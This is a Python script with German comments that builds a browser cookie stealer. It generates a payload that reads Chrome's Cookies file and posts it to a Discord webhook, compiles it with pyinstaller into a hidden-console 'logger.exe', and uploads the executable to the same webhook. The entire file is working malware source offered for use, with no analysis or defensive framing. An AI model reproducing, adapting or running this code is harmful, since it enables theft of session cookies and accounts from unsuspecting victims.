import os
import requests
import subprocess

# Funktion zum Erstellen der bösartigen .exe-Datei
def create_malicious_exe(webhook_url):
    # Der Code, der die Browserdaten sammelt und sendet
    malicious_code = f"""
import os
import requests

def get_browser_data():
    chrome_cookie_file = os.path.join(
        os.environ['USERPROFILE'],
        'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'
    )
    try:
        with open(chrome_cookie_file, 'rb') as f:
            cookies = f.read()
        return cookies
    except FileNotFoundError:
        print('[-] Chrome cookies file not found')
        return None

def send_data_to_webhook(webhook_url, data):
    files = {{'file': ('log.txt', data)}}
    response = requests.post(webhook_url, files=files)
    if response.status_code == 200:
        print('[+] Successfully sent data to webhook')
    else:
        print('[-] Error sending data to webhook')

def main():
    webhook_url = '{webhook_url}'
    browser_data = get_browser_data()
    if browser_data:
        send_data_to_webhook(webhook_url, browser_data)

if __name__ == '__main__':
    main()
"""

    # Speichern des bösartigen Codes in einer Python-Datei
    py_filename = 'logger.py'
    with open(py_filename, 'w') as f:
        f.write(malicious_code)
    print(f'[+] Python file created: {py_filename}')

    # Kompilieren der Python-Datei zu einer .exe-Datei
    subprocess.call(['pyinstaller', '--onefile', '--noconsole', py_filename])

    # Umbenennen und Verschieben der .exe-Datei
    exe_filename = 'logger.exe'
    if os.path.exists(f'dist/{exe_filename}'):
        os.rename(f'dist/{exe_filename}', exe_filename)
        print(f'[+] EXE file created: {exe_filename}')
    else:
        print('[-] Failed to create EXE file')
        return None

    return exe_filename

# Funktion zum Senden der erstellten .exe-Datei an den WebHook
def send_exe_to_webhook(webhook_url, filename):
    with open(filename, 'rb') as f:
        files = {'file': (filename, f)}
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print(f'[+] Successfully sent {filename} to webhook: {webhook_url}')
        else:
            print(f'[-] Error sending {filename} to webhook: {webhook_url}')

# Hauptfunktion
def main():
    webhook_url = input('[+] Enter your Discord webhook URL: ')
    exe_file = create_malicious_exe(webhook_url)
    if exe_file:
        send_exe_to_webhook(webhook_url, exe_file)

if __name__ == '__main__':
    main()
